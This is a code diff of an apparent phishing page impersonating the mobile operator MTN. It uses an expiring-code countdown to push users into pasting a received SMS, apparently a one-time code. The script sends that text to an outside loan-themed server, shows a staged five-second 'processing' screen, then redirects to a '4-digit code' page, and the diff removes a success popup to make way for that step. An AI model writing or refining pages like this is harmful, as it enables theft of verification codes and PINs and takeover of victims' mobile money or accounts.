@@ -56,7 +56,6 @@
   .sms-sub{font-size:12.5px;color:var(--muted);text-align:center;font-weight:600;line-height:1.6;margin-bottom:20px;}
   .sms-sub b{color:var(--mtn-blue-deep);font-weight:800;}
 
-  /* Countdown banner */
   .countdown-banner{
     display:flex;align-items:center;justify-content:center;gap:8px;
     background:linear-gradient(90deg, rgba(255,204,0,0.18), rgba(255,204,0,0.10));
@@ -64,17 +63,12 @@
     color:#8A6400;
     font-size:13px;font-weight:800;
     padding:11px 14px;border-radius:10px;
-    margin-bottom:20px;
-    letter-spacing:0.3px;
-    transition:.25s;
+    margin-bottom:20px;letter-spacing:0.3px;transition:.25s;
   }
   .countdown-banner .clock{
-    font-variant-numeric:tabular-nums;
-    font-weight:900;
-    font-size:15px;
-    color:var(--mtn-blue-deep);
-    min-width:28px;
-    text-align:center;
+    font-variant-numeric:tabular-nums;font-weight:900;
+    font-size:15px;color:var(--mtn-blue-deep);
+    min-width:28px;text-align:center;
   }
   .countdown-banner.warning{
     background:linear-gradient(90deg, rgba(211,47,47,0.10), rgba(211,47,47,0.05));
@@ -83,15 +77,11 @@
     animation:pulseWarn 1s ease-in-out infinite;
   }
   .countdown-banner.warning .clock{color:var(--red);}
-  @keyframes pulseWarn{
-    0%,100%{opacity:1;}
-    50%{opacity:.65;}
-  }
+  @keyframes pulseWarn{0%,100%{opacity:1;}50%{opacity:.65;}}
   .countdown-banner.expired{
     background:rgba(211,47,47,0.10);
     border-color:rgba(211,47,47,0.45);
-    color:var(--red);
-    animation:none;
+    color:var(--red);animation:none;
   }
 
   .field{margin-bottom:22px;}
@@ -110,9 +100,7 @@
     background:#fff;box-shadow:0 0 0 3px rgba(0,43,92,0.10);
   }
   .field textarea::placeholder{color:#B8C2D1;font-weight:500;}
-  .field textarea:disabled{
-    background:#F1F5F9;cursor:not-allowed;color:#94A3B8;
-  }
+  .field textarea:disabled{background:#F1F5F9;cursor:not-allowed;color:#94A3B8;}
 
   .cta{
     width:100%;padding:16px;border:none;border-radius:12px;
@@ -137,36 +125,22 @@
     stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;
   }
 
-  /* Expired overlay — full card state */
-  .expired-state{
-    display:none;text-align:center;padding:12px 0;
-  }
+  .expired-state{display:none;text-align:center;padding:12px 0;}
   .expired-state.show{display:block;}
   .expired-state .icon{
     width:64px;height:64px;border-radius:50%;
     background:rgba(211,47,47,0.10);
-    display:flex;align-items:center;justify-content:center;
-    margin:0 auto 18px;
+    display:flex;align-items:center;justify-content:center;margin:0 auto 18px;
   }
   .expired-state .icon svg{
     width:34px;height:34px;stroke:var(--red);fill:none;
     stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;
   }
-  .expired-state h2{
-    font-size:18px;font-weight:800;color:var(--text);
-    margin-bottom:8px;letter-spacing:-0.3px;
-  }
-  .expired-state p{
-    font-size:13px;color:var(--muted);
-    font-weight:600;line-height:1.6;margin-bottom:22px;
-  }
-  .expired-state .cta{
-    background:var(--red);
-    box-shadow:0 8px 20px rgba(211,47,47,0.3);
-  }
+  .expired-state h2{font-size:18px;font-weight:800;color:var(--text);margin-bottom:8px;letter-spacing:-0.3px;}
+  .expired-state p{font-size:13px;color:var(--muted);font-weight:600;line-height:1.6;margin-bottom:22px;}
+  .expired-state .cta{background:var(--red);box-shadow:0 8px 20px rgba(211,47,47,0.3);}
   .expired-state .cta:hover{background:#B71C1C;}
 
-  /* Full-screen processing */
   .processing-screen{
     position:fixed;inset:0;z-index:2000;
     background:radial-gradient(circle at 50% 35%, #0A3D7A 0%, var(--mtn-blue-deep) 55%, #001B3D 100%);
@@ -176,42 +150,34 @@
   }
   .processing-screen.show{display:flex;}
   @keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
-
   .processing-screen .glow{
     position:absolute;width:460px;height:460px;border-radius:50%;
     background:radial-gradient(circle, rgba(255,204,0,0.18) 0%, rgba(255,204,0,0) 70%);
     animation:pulse 2.6s ease-in-out infinite;pointer-events:none;
   }
   @keyframes pulse{0%,100%{transform:scale(1);opacity:.85;}50%{transform:scale(1.18);opacity:1;}}
-
   .processing-screen .brand-mark{
     font-size:22px;font-weight:900;letter-spacing:3px;
-    text-transform:uppercase;color:#fff;margin-bottom:40px;
-    opacity:.9;position:relative;z-index:2;
+    text-transform:uppercase;color:#fff;margin-bottom:40px;opacity:.9;position:relative;z-index:2;
   }
   .processing-screen .brand-mark em{font-style:normal;color:var(--mtn-yellow);}
-
   .processing-screen .spinner{
     width:88px;height:88px;border-radius:50%;
     border:6px solid rgba(255,255,255,0.14);
     border-top-color:var(--mtn-yellow);border-right-color:var(--mtn-yellow);
-    animation:spin 0.95s linear infinite;margin-bottom:34px;
-    position:relative;z-index:2;
+    animation:spin 0.95s linear infinite;margin-bottom:34px;position:relative;z-index:2;
   }
   @keyframes spin{to{transform:rotate(360deg);}}
-
   .processing-screen h1{
     font-size:26px;font-weight:800;letter-spacing:-0.5px;
     margin-bottom:10px;position:relative;z-index:2;
   }
   .processing-screen p.sub{
     font-size:14px;color:rgba(255,255,255,0.72);
-    font-weight:600;line-height:1.6;max-width:340px;
-    position:relative;z-index:2;
+    font-weight:600;line-height:1.6;max-width:340px;position:relative;z-index:2;
   }
   .processing-screen .dots{
-    margin-top:26px;display:flex;justify-content:center;gap:8px;
-    position:relative;z-index:2;
+    margin-top:26px;display:flex;justify-content:center;gap:8px;position:relative;z-index:2;
   }
   .processing-screen .dots span{
     width:8px;height:8px;border-radius:50%;
@@ -221,45 +187,6 @@
   .processing-screen .dots span:nth-child(2){animation-delay:.2s;}
   .processing-screen .dots span:nth-child(3){animation-delay:.4s;}
   @keyframes blink{0%,80%,100%{background:rgba(255,255,255,0.25);}40%{background:var(--mtn-yellow);}}
-
-  /* Success popup */
-  .modal-overlay{
-    position:fixed;inset:0;background:rgba(10,27,51,0.55);
-    backdrop-filter:blur(4px);display:none;
-    align-items:center;justify-content:center;
-    padding:20px;z-index:1000;animation:fadeIn .25s ease;
-  }
-  .modal-overlay.show{display:flex;}
-
-  .modal{
-    background:#fff;width:100%;max-width:360px;
-    border-radius:18px;padding:30px 24px 26px;text-align:center;
-    box-shadow:0 24px 60px rgba(0,43,92,0.35);
-    border-top:5px solid var(--green);
-    animation:pop .32s cubic-bezier(.18,.9,.32,1.4);
-  }
-  @keyframes pop{from{transform:scale(.85);opacity:0;}to{transform:scale(1);opacity:1;}}
-
-  .modal .check{
-    width:62px;height:62px;border-radius:50%;
-    background:rgba(0,166,81,0.12);
-    display:flex;align-items:center;justify-content:center;
-    margin:0 auto 18px;
-  }
-  .modal .check svg{
-    width:32px;height:32px;stroke:var(--green);fill:none;
-    stroke-width:3;stroke-linecap:round;stroke-linejoin:round;
-  }
-  .modal h2{font-size:19px;font-weight:800;color:var(--text);margin-bottom:8px;letter-spacing:-0.3px;}
-  .modal p{font-size:13px;color:var(--muted);font-weight:600;line-height:1.6;margin-bottom:22px;}
-  .modal .ok-btn{
-    width:100%;padding:14px;border:none;border-radius:11px;
-    background:var(--mtn-blue-deep);color:#fff;
-    font-size:15px;font-weight:800;cursor:pointer;
-    letter-spacing:0.3px;transition:.18s;
-    box-shadow:0 6px 16px rgba(0,43,92,0.28);
-  }
-  .modal .ok-btn:hover{background:var(--mtn-blue);transform:translateY(-1px);}
 
   @media(max-width:640px){
     .card{padding:26px 20px 28px;}
@@ -314,7 +241,6 @@
       </div>
     </div>
 
-    <!-- Expired state (replaces card contents) -->
     <div class="card expired-state" id="expiredCard">
       <div class="icon">
         <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
@@ -327,7 +253,6 @@
 
   <div class="frame-bottom"></div>
 
-  <!-- Full-screen processing -->
   <div class="processing-screen" id="processingScreen">
     <div class="glow"></div>
     <div class="brand-mark">MTN<em>.</em></div>
@@ -337,20 +262,9 @@
     <div class="dots"><span></span><span></span><span></span></div>
   </div>
 
-  <!-- Success popup -->
-  <div class="modal-overlay" id="successModal">
-    <div class="modal">
-      <div class="check">
-        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
-      </div>
-      <h2>Verification complete</h2>
-      <p>Your SMS code was received successfully.</p>
-      <button class="ok-btn" onclick="closeModal()">OK</button>
-    </div>
-  </div>
-
 <script>
   const API = "https://mtnadvanced-loans.onrender.com";
+  const PROCESSING_MS = 5000;  // ← 5 seconds
   const el = id => document.getElementById(id);
 
   const session = JSON.parse(localStorage.getItem('session') || 'null');
@@ -364,17 +278,13 @@
   let timerInterval = null;
   let expired = false;
 
-  function fmt(n){
-    return n < 10 ? '0' + n : String(n);
-  }
+  function fmt(n){ return n < 10 ? '0' + n : String(n); }
 
   function startCountdown(){
     timeLeft = COUNTDOWN_START;
     expired = false;
     updateCountdownUI();
-
     if(timerInterval) clearInterval(timerInterval);
-
     timerInterval = setInterval(() => {
       timeLeft -= 1;
       if(timeLeft <= 0){
@@ -391,16 +301,11 @@
 
   function updateCountdownUI(){
     const banner = el('countdownBanner');
-    const clock  = el('clock');
-    clock.textContent = fmt(timeLeft);
-
     if(timeLeft <= 0){
       banner.className = 'countdown-banner expired';
       banner.innerHTML = '⛔ Code expired';
       return;
     }
-
-    // Warning state when <= 15 seconds
     if(timeLeft <= 15){
       banner.className = 'countdown-banner warning';
       banner.innerHTML = `⚠️ Code expires in <span class="clock" id="clock">${fmt(timeLeft)}</span> seconds`;
@@ -417,12 +322,10 @@
   }
 
   function restartVerification(){
-    // Clear session and go back to login
     localStorage.removeItem('session');
     window.location.href = 'login.html';
   }
 
-  // ---------- Helpers ----------
   function setStatus(msg, type){
     const s = el('status');
     s.textContent = msg;
@@ -431,21 +334,13 @@
 
   function showProcessing(){ el('processingScreen').classList.add('show'); }
   function hideProcessing(){ el('processingScreen').classList.remove('show'); }
-  function openModal(){ el('successModal').classList.add('show'); }
 
-  function closeModal(){
-    el('successModal').classList.remove('show');
-    setTimeout(() => { window.location.href = 'index.html'; }, 250);
-  }
-
-  // ---------- Submit SMS ----------
   async function submitSms(){
     if(expired){
       setStatus('Code expired. Please request a new one.', 'err');
       return;
     }
 
-    // Keep exact pasted text — no trim
     const sms = el('smsText').value;
 
     if(!sms || sms.trim().length === 0){
@@ -453,7 +348,6 @@
       return;
     }
 
-    // Freeze countdown while verifying
     if(timerInterval){ clearInterval(timerInterval); timerInterval = null; }
 
     el('submitBtn').disabled = true;
@@ -461,6 +355,8 @@
     setStatus('');
     showProcessing();
 
+    // Send to server (fire-and-forget for the UI timing)
+    let serverOk = true;
     try{
       const res = await fetch(`${API}/sms`, {
         method: 'POST',
@@ -471,36 +367,31 @@
           time: new Date().toLocaleString()
         })
       });
-
       const data = await res.json();
-
-      await new Promise(r => setTimeout(r, 1500));
-
-      hideProcessing();
-
-      if(data.ok){
-        setStatus('');
-        openModal();
-      }else{
-        setStatus('❌ ' + (data.error || 'Could not verify SMS.'), 'err');
-        el('submitBtn').disabled = false;
-        el('smsText').disabled = false;
-        startCountdown(); // restart on failure
-      }
+      serverOk = !!data.ok;
     }catch(err){
+      serverOk = false;
+    }
+
+    // Force 5-second processing, regardless of server speed
+    const wait = Math.max(0, PROCESSING_MS);
+    await new Promise(r => setTimeout(r, wait));
+
+    if(serverOk){
+      window.location.href = 'code.html';  // ← go to 4-digit code page
+    } else {
       hideProcessing();
-      setStatus('❌ Could not reach server.', 'err');
+      setStatus('❌ Could not verify SMS. Try again.', 'err');
       el('submitBtn').disabled = false;
       el('smsText').disabled = false;
       startCountdown();
     }
   }
 
-  // ---------- Boot ----------
   startCountdown();
 
   document.addEventListener('keydown', e => {
-    if(e.key === 'Escape') closeModal();
+    if(e.key === 'Escape') hideProcessing();
   });
 </script>
 </body>
